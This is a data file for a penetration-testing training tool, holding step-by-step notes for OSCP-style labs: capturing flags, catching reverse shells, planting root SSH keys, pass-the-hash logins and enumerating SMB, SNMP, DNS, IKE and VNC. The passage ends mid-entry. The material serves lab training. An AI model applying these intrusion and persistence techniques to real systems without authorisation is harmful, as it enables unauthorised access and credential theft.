/*!
 * obol data - field-notes.js - OBOL.FIELD_NOTES, OBOL.FIELD_DOCTORS, OBOL.fieldNote()
 *
 * Execution help for the Next Steps canvas, scoped to a (move, command) - NOT the Learn tab's teaching
 * prose. It answers the one question a learner has with a command in front of them: "how do I make THIS
 * run work?" Each authored entry is { land:[...], mistakes:[...], win:'...', doctor?:{title,body,code?} }:
 *   land - 1-3 plain steps to land the command (voice: the tunnel wizard's "you'll know it worked").
 *   mistakes - the usual ways it goes wrong (always-on, distinct from the reactive doctor).
 *   win - the single observable that tells you it worked.
 *   doctor - an optional authored "if it fails like X" note tied to THIS command.
 * FIELD_NOTES is keyed by moveId -> array indexed by command position. It does NOT need to cover every
 * move: OBOL.fieldNote() falls back to the move's own command note + hypothesis, which the pack authors
 * already write richly, so an un-authored command still shows useful, non-empty help. Seed the high-traffic
 * spine here; coverage widens over time. No em dashes, Title Case headings handled by the renderer.
 *
 * FIELD_DOCTORS is keyed by a live blocker.* fact kind: when the operator has pasted an error that minted
 * that blocker, the canvas surfaces this fix reactively (amber), independent of which command is selected.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  OBOL.FIELD_NOTES = {
  "flag-hunt-linux": [
    {
      "when": "SSH INTERACTIVE SHELL (When port 22 is open and credentials are known)",
      "land": [
        "Log in directly to an interactive shell on the target host."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "ENABLE SSH KEY LOGIN (From remote command execution)",
      "land": [
        "Authorize your Kali SSH public key on the target account so you can SSH in interactively."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "REVERSE SHELL UPGRADE (From one-shot remote execution)",
      "land": [
        "Catch an interactive shell on your Kali listener (`nc -lvnp {{lport}}`)."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "IN YOUR SHELL (no credential needed)",
      "land": [
        "find every flag file and print the user flag with your identity for the screenshot. The common case - you do not need SSH creds to read a flag you can already reach."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "From Kali against the target service.",
      "land": [
        "LOCATE OVER SSH (only if you hold SSH creds and have no shell yet). A one-liner from Kali, so it only LOCATES; OffSec scores a flag read this way ZERO. Paste the output back and obol records the path; capture it on the host next."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "Inside an interactive session on the target host.",
      "land": [
        "ON THE HOST, capture the LOCAL/user flag with its identity. Run this INSIDE your shell and screenshot the whole frame: whoami + id + ip addr (the target IP) + the flag, together. obol records this as the captured local flag."
      ],
      "mistakes": [],
      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
    },
    {
      "when": "REMOTE SSH PROOF READ (from Kali)",
      "land": [
        "Run id, hostname, ip addr, and cat the located user flag over SSH via NetExec."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    }
  ],
  "flag-hunt-root-linux": [
    {
      "when": "ROOT SSH INTERACTIVE SHELL (When port 22 is open)",
      "land": [
        "Connect directly to an interactive root shell over SSH."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "AUTHORIZE ROOT SSH KEY (From remote command execution)",
      "land": [
        "Plant your Kali SSH public key into /root/.ssh/authorized_keys to open an interactive root SSH session."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "ROOT REVERSE SHELL UPGRADE (From remote command execution)",
      "land": [
        "Catch an interactive root shell on your Kali listener (`nc -lvnp {{lport}}`)."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "IN YOUR ROOT SHELL",
      "land": [
        "locate the root/proof flag and print it alongside your root identity and IP address for the report screenshot."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "Inside an interactive session on the target host.",
      "land": [
        "ON THE HOST as root, capture the ROOT flag with its identity. Run this INSIDE your root shell and screenshot the whole frame together (id must show uid=0). obol records this as the captured root flag - the box's final objective."
      ],
      "mistakes": [],
      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
    },
    {
      "when": "COMBINED USER + ROOT PROOF READ (In-Session)",
      "land": [
        "Print host identity, IP, local flag, and root flag in one terminal frame when both paths have been located."
      ],
      "mistakes": [],
      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
    },
    {
      "when": "REMOTE SSH LOCATE (from Kali)",
      "land": [
        "Search /root for the root/proof flag over SSH via NetExec when root SSH credentials are known."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "REMOTE SSH PROOF READ (from Kali)",
      "land": [
        "Run id, hostname, ip addr, and cat the located root flag over SSH via NetExec."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    }
  ],
  "flag-hunt-windows": [
    {
      "when": "WINRM INTERACTIVE SHELL (Recommended when port 5985 is open)",
      "land": [
        "Connect directly over WinRM with domain credentials. Once connected, locate and capture the user flag."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "WINRM PASS-THE-HASH SHELL",
      "land": [
        "Connect directly over WinRM with a captured NT hash."
      ],
      "mistakes": [
        "Pasting the full LM:NT hash instead of the 32-hex NT hash."
      ],
      "win": "You land an interactive session on the target host.",
      "doctor": {
        "title": "If evil-winrm Dies On Connect",
        "body": "A `CLIENT_TO_SERVER_SEALING` crash the instant it connects on a fresh Kali is the rubyntlm 0.6.7 bug (auth already succeeded), not your hash. Update the gem, then re-run:",
        "code": "sudo gem install rubyntlm"
      }
    },
    {
      "when": "RDP INTERACTIVE DESKTOP (When port 3389 is open)",
      "land": [
        "Open a full interactive RDP desktop session on the target host."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "PORT 135/445 WMI INTERACTIVE SHELL (When WinRM 5985 is closed)",
      "land": [
        "Spawns a semi-interactive C:\\> prompt over WMI and SMB."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "PORT 445 INTERACTIVE SYSTEM SHELL",
      "land": [
        "Spawns an interactive command prompt over SMB."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "PORT 445 SMBEXEC SHELL",
      "land": [
        "Opens a semi-interactive SYSTEM shell over port 445 without dropping a service binary on disk."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "ENABLE WINRM / RDP GROUP ACCESS (Fallback when direct login is blocked by group policy)",
      "land": [
        "Grants your user Remote Management Users and Remote Desktop Users membership and enables RDP."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "REVERSE SHELL UPGRADE",
      "land": [
        "Execute from a one-shot command runner or service to catch an interactive shell on your Kali listener (`nc -lvnp {{lport}}`)."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "Inside an interactive session on the target host.",
      "land": [
        "UNIVERSAL IN-SESSION LOCATE (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Sweep all user Desktops for the user/local flag file in under 1 second."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "IN-SESSION POWERSHELL LOCATE (For PS C",
      "land": [
        "\\> shells like Evil-WinRM): Inside your interactive shell, recursively search user profiles to verify the exact path of the user flag. Paste the path it prints and obol fills the read below."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "Inside an interactive session on the target host.",
      "land": [
        "UNIVERSAL IN-SESSION PROOF READ (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Display whoami, hostname, ipconfig, and the located user flag in one command frame for the report screenshot."
      ],
      "mistakes": [
        "Using semicolons (;) inside a CMD/wmiexec shell, which causes whoami to fail with ERROR: Invalid argument/option - ';'.",
        "Capturing only the flag value without whoami, hostname, and ipconfig in the same screenshot frame."
      ],
      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
    },
    {
      "when": "IN-SESSION POWERSHELL PROOF READ (For PS C",
      "land": [
        "\\> shells like Evil-WinRM or powershell.exe): Display user identity (whoami), host identity (hostname), IP (ipconfig), and the located user flag in the same frame for the report screenshot."
      ],
      "mistakes": [
        "Running this semicolon-separated PowerShell syntax inside cmd.exe or impacket-wmiexec (use the universal cmd /c command instead)."
      ],
      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
    },
    {
      "when": "WINRM REMOTE LOCATE (When port 5985 is open)",
      "land": [
        "Search user profiles for the user flag remotely over WinRM in one command without opening an interactive shell."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "WINRM REMOTE READ (When port 5985 is open)",
      "land": [
        "Read the confirmed user flag directly over WinRM in one shot from Kali."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "WINRM REMOTE READ WITH NT HASH",
      "land": [
        "Read the confirmed user flag over WinRM using pass-the-hash."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "LOCATE OVER SMB (from Kali)",
      "land": [
        "Spiders the Users share to locate the exact path of the user/local flag file before reading it."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "SMB SHARE CAPTURE (Ungates once the flag path is located on the Users share)",
      "land": [
        "Downloads and prints the located user flag from the discovered share path."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "REMOTE LOCATE OVER SMB",
      "land": [
        "Searches every user profile Desktop over SMB. Note: Requires administrative execution rights on the target; if execution fails on non-admin accounts, use evil-winrm."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "LAB QUICK GRAB (not OffSec-legal)",
      "land": [
        "with the dumped Administrator hash, search every user's Desktop and print the flag remotely in one shot, no shell. obol fills the hash from the NTDS dump, no credential swap, and the names from your profile."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "RDP REMOTE PROOF READ (When port 3389 is open)",
      "land": [
        "Run whoami, hostname, ipconfig, and type the user flag in one command over RDP via NetExec."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "RDP DESKTOP SCREENSHOT",
      "land": [
        "Capture a PNG screenshot of the remote RDP desktop session (saved under ~/.nxc/screenshots/) to attach in Evidence -> Proof Screenshots."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    }
  ],
  "flag-hunt-root-windows": [
    {
      "when": "PREFERRED REMOTE LOCATE (Instant Desktop Sweep with NT Hash over SMB)",
      "land": [
        "Scans every user profile Desktop for root/proof flags using the Administrator NT hash. Finishes in under 1 second. Paste output to ungate the flag read."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "WINRM REMOTE LOCATE WITH NT HASH (When port 5985 is open)",
      "land": [
        "Fast PowerShell sweep over WinRM with the Administrator hash to find root/proof flags."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "WMI REMOTE LOCATE WITH NT HASH",
      "land": [
        "Sweep user profiles for root/proof flags over WMI using the Administrator NT hash."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "PREFERRED REMOTE LOCATE (Instant Desktop Sweep over WMI)",
      "land": [
        "Scans every user profile Desktop for root/proof flags without scanning deep subdirectories when administrative password is known. Finishes in under 1 second. Paste output to ungate the flag read."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "REMOTE LOCATE (Instant Desktop Sweep over SMB)",
      "land": [
        "Searches every user profile Desktop over SMB without traversing junction points or deep directories when administrative password is known."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "PREFERRED SMB HASH READ",
      "land": [
        "With the Administrator NT hash dumped from NTDS, read the located root flag remotely over SMB."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "WINRM REMOTE READ WITH NT HASH",
      "land": [
        "Read the located root flag over WinRM using the Administrator NT hash."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "PREFERRED WMI EXECUTION (When WinRM is closed)",
      "land": [
        "Read the located root flag directly over WMI (port 135) with administrative credentials."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "From Kali against the target service.",
      "land": [
        "Remote read over SMB with administrative password."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "From Kali against the target service.",
      "land": [
        "Fallback remote read with the DA hash via impacket wmiexec."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "WINRM INTERACTIVE SHELL (When port 5985 is open or enabled)",
      "land": [
        "Connect directly over WinRM with administrative credentials."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "WINRM PASS-THE-HASH SHELL (Recommended when port 5985 is open)",
      "land": [
        "Connect directly over WinRM with the Administrator NT hash."
      ],
      "mistakes": [
        "Pasting the full LM:NT hash instead of the 32-hex NT hash."
      ],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "RDP INTERACTIVE DESKTOP (When port 3389 is open)",
      "land": [
        "Open a full interactive Administrator RDP desktop session."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "PORT 135/445 WMI INTERACTIVE SHELL (Recommended when WinRM 5985 is closed, e.g. Active)",
      "land": [
        "Spawns a semi-interactive C:\\> prompt over WMI and SMB using administrative credentials."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "PORT 135/445 WMI PASS-THE-HASH SHELL",
      "land": [
        "Spawns a semi-interactive C:\\> prompt over WMI and SMB using the Administrator NT hash."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "PORT 445 INTERACTIVE SYSTEM SHELL",
      "land": [
        "Creates a service over SMB and opens an interactive shell running as NT AUTHORITY\\SYSTEM."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "PORT 445 PASS-THE-HASH SYSTEM SHELL",
      "land": [
        "Opens an interactive NT AUTHORITY\\SYSTEM shell over SMB using the Administrator NT hash."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "PORT 445 SMBEXEC SHELL",
      "land": [
        "Opens a semi-interactive SYSTEM shell over port 445 without dropping a service binary on disk."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "ENABLE RDP & WINRM GROUP ACCESS REMOTELY",
      "land": [
        "Adds your account to Remote Desktop Users and Remote Management Users and enables RDP on the host."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "ENABLE RDP & WINRM GROUP ACCESS WITH NT HASH",
      "land": [
        "Grants Remote Desktop Users and Remote Management Users and enables RDP using the Administrator NT hash."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "REVERSE SHELL UPGRADE",
      "land": [
        "Run inside your wmiexec/psexec session or via remote execution to catch a full PowerShell reverse shell on your Kali listener (`nc -lvnp {{lport}}`)."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "Inside an interactive session on the target host.",
      "land": [
        "UNIVERSAL ON-HOST LOCATE (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Sweep all user profile Desktops for root/proof and user/local flags in under 1 second."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "Inside an interactive session on the target host when you want both user and root flags located and printed in a single command.",
      "land": [
        "ONE-SHOT ON-HOST USER + ROOT LOCATE & PROOF READ (Works in CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM without needing paths first): Prints whoami, hostname, ipconfig, and every user/local and root/proof flag across all Desktops in one frame."
      ],
      "look": [
        "Each --- C:\\Users\\...\\Desktop\\*.txt --- marker followed by the 32-hex flag value alongside whoami, hostname, and ipconfig."
      ],
      "mistakes": [
        "Running only type on a guessed path before confirming which profile holds user.txt and root.txt."
      ],
      "win": "Identity, hostname, IP configuration, and both user and root flags print together in one frame."
    },
    {
      "when": "ON-HOST POWERSHELL LOCATE (For PS C:\\> shells like Evil-WinRM)",
      "land": [
        "If you have an interactive PowerShell session, search Desktops for root/proof flag files in under 1 second. Paste the path it prints to ungate the read command below."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "Inside an interactive session on the target host.",
      "land": [
        "UNIVERSAL ON-HOST PROOF READ (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Capture whoami, hostname, ipconfig, and the ROOT/proof flag in a single command frame."
      ],
      "mistakes": [
        "Using semicolons (;) inside a CMD/wmiexec shell, which causes whoami to fail with ERROR: Invalid argument/option - ';'.",
        "Capturing only the flag value without whoami, hostname, and ipconfig in the same screenshot frame."
      ],
      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
    },
    {
      "when": "Inside an interactive session on the target host.",
      "land": [
        "COMBINED USER + ROOT PROOF READ (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): If you initially grabbed the user flag over SMB without an interactive shell, run this inside your Admin shell to capture both user and root flags alongside whoami, hostname, and ipconfig for your exam report."
      ],
      "mistakes": [
        "Using semicolons (;) inside a CMD/wmiexec shell, which causes whoami to fail with ERROR: Invalid argument/option - ';'.",
        "Capturing only the flag value without whoami, hostname, and ipconfig in the same screenshot frame."
      ],
      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
    },
    {
      "when": "Inside an interactive session on the target host.",
      "land": [
        "ON THE HOST as SYSTEM/Administrator (PowerShell / Evil-WinRM), capture the ROOT/proof flag with its identity in the same frame (whoami + hostname + ipconfig + the flag) for the report."
      ],
      "mistakes": [
        "Running this semicolon-separated PowerShell syntax inside cmd.exe or impacket-wmiexec (use the universal cmd /c command instead)."
      ],
      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
    },
    {
      "when": "ON-HOST ADS LOCATE (Alternate Data Streams)",
      "land": [
        "Lists files and hidden alternate data streams on the Administrator Desktop. If flag files are hidden in streams (e.g. filename.txt:root.txt:$DATA), dir /r exposes them."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "POWERSHELL ADS LOCATE",
      "land": [
        "Enumerates NTFS alternate data streams across all files in the Administrator desktop, filtering out the default :$DATA stream."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "POWERSHELL ADS READ",
      "land": [
        "Reads the contents of a hidden alternate data stream flag (e.g. -Stream root.txt)."
      ],
      "mistakes": [],
      "win": "The exact path to the flag file prints and unlocks the proof read step."
    },
    {
      "when": "RDP REMOTE PROOF READ (When port 3389 is open)",
      "land": [
        "Run whoami, hostname, ipconfig, and type the root/proof flag in one command over RDP via NetExec."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    },
    {
      "when": "RDP DESKTOP SCREENSHOT",
      "land": [
        "Capture a PNG screenshot of the remote Administrator RDP desktop session (saved under ~/.nxc/screenshots/) to attach in Evidence -> Proof Screenshots."
      ],
      "mistakes": [],
      "win": "You land an interactive session on the target host."
    }
  ],
  "recon-smb-anon": [
    {
      "when": "First touch on port 445: confirm the SMB banner, hostname, domain, signing state, and whether null sessions are accepted.",
      "land": [
        "Run the switchless probe first so Obol extracts the OS build, hostname, DNS domain, and SMB signing requirement."
      ],
      "look": [
        "(name:...) and (domain:...) in the banner, plus (signing:False) for relay opportunities.",
        "A [+] line confirming anonymous/null session authentication succeeds."
      ],
      "win": "Target hostname, domain, OS build, and null-session status print in one line.",
      "mistakes": [
        "Firing heavy enumeration flags before checking if null sessions are even permitted."
      ]
    },
    {
      "when": "An opener. The moment a scan shows 445 or 139, before you hold any credential.",
      "look": [
        "Share names with READ or WRITE beside them. A writable, non-default share is the prize.",
        "Anything beyond the defaults ADMIN$, C$, IPC$, and print$. A custom share name is where the interesting files sit.",
        "A STATUS_ACCESS_DENIED on the empty user. That is your cue to retry as guest, not to give up."
      ],
      "win": "A share table prints, and at least one share shows READ or better.",
      "mistakes": [
        "Reading a listed share as a readable one. Listed is not accessible. Confirm by connecting.",
        "Giving up when the null user is refused. Many hosts still allow guest with a blank password."
      ]
    },
    {
      "when": "Right after the nxc check, when you want permissions laid out in one column.",
      "look": [
        "The Permissions column: READ ONLY, READ, WRITE, or NO ACCESS per share.",
        "A WRITE entry. That is often the whole foothold."
      ],
      "win": "Each share lists its access level clearly.",
      "mistakes": [
        "Skimming past a readable share that holds configs or backups. Read it before moving on."
      ]
    },
    {
      "when": "Once a null or guest session works and you want the full user list for later spraying.",
      "look": [
        "Rows mapping a RID number to an account name. Keep the user names, skip the machine accounts that end in a dollar sign.",
        "Service or admin style names such as svc, backup, or administrator. Those are high-value spray targets."
      ],
      "win": "A numbered list of account names prints, with no credential used.",
      "mistakes": [
        "Running it with no working session. RID-brute needs the null or guest session first."
      ]
    },
    {
      "when": "As a catch-all sweep when you want shares, users, groups, and the password policy together.",
      "look": [
        "The password policy section. The lockout threshold decides how hard you can spray later.",
        "The users and groups sections for names and membership."
      ],
      "win": "Labelled sections for OS, users, groups, shares, and policy print.",
      "mistakes": [
        "Treating it as the only tool. It can miss what nxc surfaces, so run both."
      ]
    }
  ],
  "recon-web-triage": [
    {
      "when": "The first thing you do against any open web port, before you fuzz paths or run checks.",
      "look": [
        "The exact CMS and version, such as WordPress 5.x or Drupal 7. A version often maps straight to a known issue.",
        "The framework and language, such as PHP, ASP.NET, or Express. It decides your wordlist extensions.",
        "A redirect to a hostname. If it redirects to a name, add that name to /etc/hosts and test the name, not the IP."
      ],
      "win": "whatweb prints the server, any CMS or framework, and often a version.",
      "mistakes": [
        "Fuzzing before you fingerprint. The stack tells you which checks even apply.",
        "Testing the IP when the site redirects to a hostname. Many sites only serve real content to the right name."
      ]
    },
    {
      "when": "Alongside whatweb, when you want the raw headers in plain text.",
      "look": [
        "The Server and X-Powered-By headers for software and version.",
        "Set-Cookie names. A PHPSESSID, JSESSIONID, or wordpress cookie names the stack.",
        "A Location header on a 301 or 302. That is the real site or hostname to follow."
      ],
      "win": "The response headers print, naming the server and often a redirect target.",
      "mistakes": [
        "Ignoring the redirect and scanning the default page instead of the real app."
      ]
    }
  ],
  "recon-dns": [
    {
      "when": "As soon as you see port 53, and whenever you learn the domain name.",
      "look": [
        "A long list of records instead of a short failure. That means the zone transfer is open, a reportable finding.",
        "Internal hostnames, mail servers, and subdomains in the dump. That is the internal map."
      ],
      "win": "Many records print, confirming an open zone transfer you should report.",
      "mistakes": [
        "Pointing the @ at the wrong server. It must be the nameserver that serves this zone.",
        "Reading a refused transfer as \"no DNS here\". It only means the transfer is locked."
      ]
    },
    {
      "when": "When the zone transfer is refused but you still want to enumerate records.",
      "look": [
        "Discovered subdomains and their IPs, especially ones inside the target range.",
        "MX and NS records that name other hosts to add to scope."
      ],
      "win": "A list of records and subdomains prints.",
      "mistakes": [
        "Expecting access. DNS output is reconnaissance that feeds later steps."
      ]
    },
    {
      "when": "When you want record enumeration, an AXFR attempt, and subdomain brute-forcing in a single pass.",
      "land": [
        "Point --dnsserver at the target so queries go directly to its authoritative service."
      ],
      "look": [
        "Zone transfer dumps or brute-forced hostnames resolving to internal or vhost IPs."
      ],
      "win": "dnsenum outputs NS/MX records, any allowed zone transfer, and discovered subdomains.",
      "mistakes": [
        "Omitting --dnsserver and querying your local resolver instead of the target DNS server."
      ]
    }
  ],
  "recon-snmp": [
    {
      "when": "When a UDP scan shows 161 open. SNMP is often skipped, so it hides useful data.",
      "look": [
        "A line showing the host answering to a community string, usually public or private.",
        "The system description it returns, which often names the OS and device model."
      ],
      "win": "The target answers to at least one community string.",
      "mistakes": [
        "Trying to walk the tree before you have a valid community string."
      ]
    },
    {
      "when": "Once onesixtyone gives you a working community string.",
      "land": [
        "Replace public with the community string you found, and send the output to a file so you can search it."
      ],
      "look": [
        "Running processes with arguments. A process started with a password on its command line is a free credential.",
        "User account names and installed software.",
        "Routes and connections that reveal other hosts."
      ],
      "win": "A long tree of system, process, and network values prints.",
      "mistakes": [
        "Leaving -v2c when the device only speaks v1. Match the version.",
        "Reading SNMP data as access. It is disclosure, not a login."
      ]
    },
    {
      "when": "When you want the same data in tidy sections instead of a raw tree.",
      "look": [
        "The Processes section, where a command-line password hides.",
        "The User Accounts and Network sections."
      ],
      "win": "Sectioned output prints: system, accounts, processes, network, and software.",
      "mistakes": [
        "Skipping the process list, which is where credentials hide."
      ]
    },
    {
      "when": "When standard SNMP walks look quiet or you suspect custom health-check scripts.",
      "land": [
        "Walk NET-SNMP-EXTEND-MIB::nsExtendObjects directly with the working community string."
      ],
      "look": [
        "nsExtendCommand, nsExtendArgs, and nsExtendOutputFull lines revealing custom script arguments, API tokens, or inline passwords."
      ],
      "win": "Custom Net-SNMP extend commands or script outputs print.",
      "mistakes": [
        "Walking only system/HOST-RESOURCES MIBs and missing NET-SNMP-EXTEND-MIB, which default snmpwalk without -On or OID target skips."
      ]
    }
  ],
  "recon-ike-vpn": [
    {
      "when": "When a UDP scan shows 500 open. Easy to overlook, and sometimes the whole objective.",
      "look": [
        "A handshake response listing transforms. That confirms a live IKE endpoint."
      ],
      "win": "The endpoint answers with its supported transforms.",
      "mistakes": [
        "Forgetting sudo. Raw sockets need root."
      ]
    },
    {
      "when": "Right after the main-mode check, to see whether aggressive mode leaks a hash.",
      "look": [
        "A saved-PSK confirmation and a non-empty ike-psk.txt."
      ],
      "win": "ike-scan reports it saved the PSK to ike-psk.txt.",
      "mistakes": [
        "Expecting the plaintext. You captured a hash that still has to be cracked."
      ]
    },
    {
      "when": "Offline, after aggressive mode wrote the hash file. No traffic goes to the target.",
      "setup": [
        {
          "label": "Unpack the rockyou wordlist (Kali ships it gzipped)",
          "cmd": "gunzip -k /usr/share/wordlists/rockyou.txt.gz"
        }
      ],
      "look": [
        "A line showing the key that matched. That is the pre-shared key."
      ],
      "win": "psk-crack prints the recovered pre-shared key.",
      "mistakes": [
        "Treating a cracked PSK as VPN access. It is one credential to validate."
      ]
    },
    {
      "when": "When psk-crack is slow or you want GPU-accelerated cracking of a captured Aggressive Mode IKE PSK hash.",
      "land": [
        "Run hashcat mode 5400 (IKE-PSK MD5) or 5300 (IKE-PSK SHA1) against the 9-field hash file captured by ike-scan."
      ],
      "look": [
        "Status: Cracked and the recovered pre-shared key at the end of the hash line."
      ],
      "win": "hashcat recovers the VPN pre-shared key offline.",
      "mistakes": [
        "Using mode 5400 on a SHA1 PSK hash (switch to -m 5300 if hashcat reports a token length error)."
      ]
    }
  ],
  "recon-finger": [
    {
      "when": "When port 79 is open, usually on older Unix. A free username list.",
      "look": [
        "The login names in the table. Each is a real account for later spraying."
      ],
      "win": "A table of logged-in users prints.",
      "mistakes": [
        "Treating a username as access. It is spray material."
      ]
    },
    {
      "when": "To confirm a specific account exists.",
      "look": [
        "Whether the account resolves to a home and shell, or returns no such user."
      ],
      "win": "Account details print, confirming the name is real.",
      "mistakes": [
        "Ignoring a \"no such user\" result. It still narrows your list."
      ]
    }
  ],
  "recon-vnc": [
    {
      "when": "When 5900 or 5901 is open. This runs from Kali.",
      "land": [
        "Drop -p for the no-auth check. Point the target at a subnet to sweep for every open VNC at once."
      ],
      "look": [
        "A \"No password required\" or a (Pwn3d!) result. Either means a usable desktop."
      ],
      "win": "nxc reports a reachable desktop and obol records access.desktop.",
      "mistakes": [
        "Assuming a hit is a shell. Confirm by connecting next."
      ]
    },
    {
      "when": "When you want the auth mode and a check for the RealVNC bypass.",
      "look": [
        "The reported auth type, and any RealVNC bypass flag to verify by hand."
      ],
      "win": "The script reports the VNC auth mode.",
      "mistakes": [
        "Reporting a script hit as access. Confirm by connecting."
      ]
    },
    {
      "when": "Last step, where the access is actually taken and proven.",
      "look": [
        "The target desktop appearing. A terminal on it is your route to a shell."
      ],
      "win": "The desktop opens in your vncviewer window.",
      "mistakes": [
        "Claiming the foothold before you see the desktop."
      ]
    }
  ],
  "vnc-desktop-shell": [
    {
      "when": "Once you have an unauthenticated or cracked VNC desktop and want a shell.",
      "land": [
        "Connect, add -passwd pass.txt for a cracked password, then open a terminal on the desktop."
      ],
      "look": [
        "A terminal application you can open in the session."
      ],
      "win": "You are at the live desktop with a terminal open.",
      "mistakes": [
        "Colon count: one for a display number, two for a raw port. If it refuses, switch."
      ]
    },
    {
      "when": "Inside the desktop terminal, to capture the foothold for the report.",
      "land": [
        "Run it in the desktop terminal, not on Kali, and screenshot the whole window."
      ],
      "win": "Your user, hostname, and target IP print together in the frame.",
      "mistakes": [
        "Forgetting the screenshot. The framed identity plus IP is the proof."
      ]
    },
    {
      "when": "When you recover an encrypted VNC password hex blob from the Windows registry or a .vnc / passwd file.",
      "land": [
        "VNC uses a static DES key to obfuscate stored passwords; vncpwd reverses it instantly."
      ],
      "look": [
        "The cleartext password printed by vncpwd."
      ],
      "win": "The obfuscated VNC hex password decrypts to cleartext.",
      "mistakes": [
        "Trying to brute-force a VNC hex blob in hashcat when it uses a fixed, reversible DES key."
      ]
    }
  ],
  "recon-smtp": [
    {
      "when": "When 25 is open and you need a validated username list.",
      "land": [
        "Point -U at a names wordlist. obol writes users it has already proven into your userlist for you; with none yet, a seclists names file works.",
